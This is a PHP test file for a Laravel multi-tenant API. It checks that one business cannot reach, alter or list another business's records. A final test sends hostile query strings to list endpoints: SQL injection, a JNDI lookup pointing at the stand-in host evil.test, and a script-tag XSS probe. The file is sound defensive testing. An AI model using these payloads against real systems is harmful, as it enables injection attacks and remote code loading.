<?php

declare(strict_types=1);

use App\Models\Appointment;
use App\Models\BusinessClosure;
use App\Models\Conversation;
use App\Models\Customer;
use App\Models\Department;
use App\Models\LoginDevice;
use App\Models\Product;
use App\Models\Service;
use App\Models\ServiceCategory;
use App\Models\SupportTicket;
use App\Models\TeamInvitation;
use App\Models\User;
use App\Services\Tenant;
use Database\Seeders\MenuSeeder;
use Database\Seeders\RolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Testing\TestResponse;

uses(DatabaseTransactions::class);

/*
|--------------------------------------------------------------------------
| One business can never reach another's records through the app API
|--------------------------------------------------------------------------
| The owner of business A calls every route that takes an id with the REAL ids
| of business B. Nothing may answer success, B's rows must be exactly as they
| were, and nothing of B may show up in A's own lists. Routes that take no
| body must answer 404: a refusal because of the id, never because of the data.
*/

beforeEach(function (): void {
    $this->seed(RolesAndPermissionsSeeder::class);
    $this->seed(MenuSeeder::class);

    $this->owner = payingUser();
    $this->owner->assignRole('client');
    $this->rival = payingUser();
    $this->rival->assignRole('client');

    $theirs = $this->rival->business_id;
    $this->twinEmail = 'twin@example.com';

    $this->mine = Customer::factory()->create(['business_id' => $this->owner->business_id, 'name' => 'Mi cliente', 'email' => $this->twinEmail]);
    $this->customer = Customer::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B cliente', 'email' => $this->twinEmail]);
    $this->conversation = Conversation::factory()->create(['business_id' => $theirs, 'contact_name' => 'SECRETO-B hilo']);
    $this->device = LoginDevice::factory()->for($this->rival)->create();
    $this->service = Service::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B servicio']);
    $this->category = ServiceCategory::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B categoria']);
    $this->product = Product::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B producto']);
    $this->appointment = Appointment::factory()->create(['business_id' => $theirs, 'customer_id' => $this->customer->id, 'service_id' => $this->service->id]);
    $this->closure = BusinessClosure::factory()->create(['business_id' => $theirs]);
    $this->department = Department::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B depto']);
    $this->invitation = TeamInvitation::factory()->create(['business_id' => $theirs]);
    $this->agent = User::factory()->create(['business_id' => $theirs, 'name' => 'SECRETO-B agente']);
    $this->agent->assignRole('agent');
});

function asIsolationApp(User $user, string $method, string $uri, array $body = []): TestResponse
{
    app('auth')->forgetGuards();

    return test()->withToken(appInstallToken($user))->withHeaders(apiDeviceHeaders())->json($method, $uri, $body);
}

/** What business B holds, read from inside B, so a change made through A shows. */
function rivalSnapshot(): array
{
    $b = test()->rival->business_id;

    return app(Tenant::class)->for($b, fn (): array => [
        'customer' => Customer::query()->find(test()->customer->id)?->only(['name', 'email', 'marketing_opt_in_at']),
        'customers' => Customer::query()->count(),
        'conversations' => Conversation::query()->count(),
        'service' => Service::query()->find(test()->service->id)?->only(['name', 'is_active', 'deleted_at']),
        'category' => ServiceCategory::query()->find(test()->category->id)?->only(['name', 'sort_order']),
        'product' => Product::query()->find(test()->product->id)?->only(['name', 'is_active', 'deleted_at']),
        'appointment' => Appointment::query()->find(test()->appointment->id)?->only(['status', 'starts_at']),
        'closure' => BusinessClosure::query()->find(test()->closure->id)?->only(['starts_on', 'ends_on']),
        'department' => Department::query()->find(test()->department->id)?->only(['name']),
        'invitation' => TeamInvitation::query()->find(test()->invitation->id)?->only(['email']),
    ]) + [
        'agent' => User::query()->find(test()->agent->id)?->only(['name', 'business_id']),
        'device' => LoginDevice::query()->find(test()->device->id)?->only(['fingerprint']),
    ];
}

test('every id-taking route refuses the ids of another business and leaves them untouched', function (): void {
    $before = rivalSnapshot();

    $mustBeNotFound = [
        ['GET', "customers/{$this->customer->id}"],
        ['POST', "customers/{$this->customer->id}/opt-in"],
        ['GET', "conversations/{$this->conversation->id}"],
        ['DELETE', "account/devices/{$this->device->id}"],
        ['POST', "agenda/bookings/{$this->appointment->id}/cancel"],
        ['POST', "agenda/bookings/{$this->appointment->id}/done"],
        ['DELETE', "business/closures/{$this->closure->id}"],
        ['POST', "business/closures/{$this->closure->id}/tell"],
        ['GET', "products/{$this->product->id}"],
        ['DELETE', "products/{$this->product->id}"],
        ['POST', "products/{$this->product->id}/restore"],
        ['POST', "products/{$this->product->id}/toggle"],
        ['GET', "services/{$this->service->id}"],
        ['DELETE', "services/{$this->service->id}"],
        ['POST', "services/{$this->service->id}/restore"],
        ['POST', "services/{$this->service->id}/toggle"],
        ['DELETE', "team/departments/{$this->department->id}"],
        ['DELETE', "team/invitations/{$this->invitation->id}"],
        ['POST', "team/invitations/{$this->invitation->id}/resend"],
        ['DELETE', "team/members/{$this->agent->id}"],
    ];

    $withBody = [
        ['PUT', "customers/{$this->customer->id}", ['name' => 'HACKEADO', 'email' => 'hack@example.com']],
        ['POST', "customers/{$this->mine->id}/merge", ['duplicate_id' => $this->customer->id]],
        ['POST', "customers/{$this->customer->id}/merge", ['duplicate_id' => $this->mine->id]],
        ['PUT', "agenda/bookings/{$this->appointment->id}", ['day' => now()->addDays(3)->format('Y-m-d'), 'time' => '10:00']],
        ['PUT', "products/{$this->product->id}", ['name' => 'HACKEADO']],
        ['PUT', "services/{$this->service->id}", ['name' => 'HACKEADO']],
        ['PUT', "services/categories/{$this->category->id}/position", ['position' => 0]],
        ['PUT', "team/departments/{$this->department->id}", ['name' => 'HACKEADO', 'user_ids' => [$this->agent->id]]],
        ['PUT', "team/members/{$this->agent->id}", ['whatsapp' => '584125550000', 'department_ids' => [$this->department->id]]],
    ];

    $leaks = [];

    foreach ($mustBeNotFound as [$method, $uri]) {
        $status = asIsolationApp($this->owner, $method, "/api/v1/{$uri}")->status();

        if ($status !== 404) {
            $leaks[] = "{$method} {$uri} -> {$status} (expected 404)";
        }
    }

    foreach ($withBody as [$method, $uri, $body]) {
        $status = asIsolationApp($this->owner, $method, "/api/v1/{$uri}", $body)->status();

        if ($status >= 200 && $status < 300) {
            $leaks[] = "{$method} {$uri} -> {$status} (a success across businesses)";
        }
    }

    expect($leaks)->toBe([])
        ->and(rivalSnapshot())->toEqual($before);
});

test('nothing of another business shows up in the lists of the app', function (): void {
    SupportTicket::factory()->create(['business_id' => $this->rival->business_id, 'body' => 'SECRETO-B soporte']);

    $lists = ['customers', 'conversations', 'services', 'products', 'team', 'agenda', 'business/closures', 'business',
        'business/hours', 'support', 'payments', 'notifications', 'digests', 'plan', 'whatsapp', 'account', 'account/devices'];
    $problems = [];

    foreach ($lists as $list) {
        $response = asIsolationApp($this->owner, 'GET', "/api/v1/{$list}");

        // A list that does not answer would pass for the wrong reason: it must really be read.
        if ($response->status() !== 200) {
            $problems[] = "/{$list} answered {$response->status()}, so it proves nothing";
        } elseif (str_contains($response->getContent(), 'SECRETO-B')) {
            $problems[] = "/{$list} shows another business's data";
        }
    }

    expect($problems)->toBe([]);
});

test('hostile input in the query never breaks a list, leaks SQL or reaches another business', function (): void {
    $lists = ['customers', 'conversations', 'services', 'products', 'team', 'agenda', 'business/closures', 'support',
        'payments', 'notifications', 'digests', 'account/devices'];
    $hostile = [
        "' OR 1=1 --",
        '"; DROP TABLE users; --',
        '%',
        '_',
        '\\',
        "\0",
        str_repeat('a', 6000),
        '💥 ñandú',
        '${jndi:ldap://evil.test/x}',
        '<script>alert(1)</script>',
    ];
    $problems = [];

    foreach ($lists as $list) {
        foreach ($hostile as $value) {
            // Every key a list might read, all at once: the point is that none of them is trusted.
            $query = http_build_query(['search' => $value, 'q' => $value, 'filter' => $value, 'page' => $value, 'cursor' => $value, 'before' => $value, 'day' => $value]);
            $response = asIsolationApp($this->owner, 'GET', "/api/v1/{$list}?{$query}");
            $label = "/{$list} with ".json_encode(mb_substr($value, 0, 20));

            if ($response->status() >= 500) {
                $problems[] = "{$label} answered {$response->status()}";
            } elseif (preg_match('/SQLSTATE|syntax error|Illuminate\\\\|vendor\/|Stack trace/i', $response->getContent()) === 1) {
                $problems[] = "{$label} leaked an internal message";
            } elseif (str_contains($response->getContent(), 'SECRETO-B')) {
                $problems[] = "{$label} shows another business's data";
            }
        }
    }

    expect($problems)->toBe([]);
});
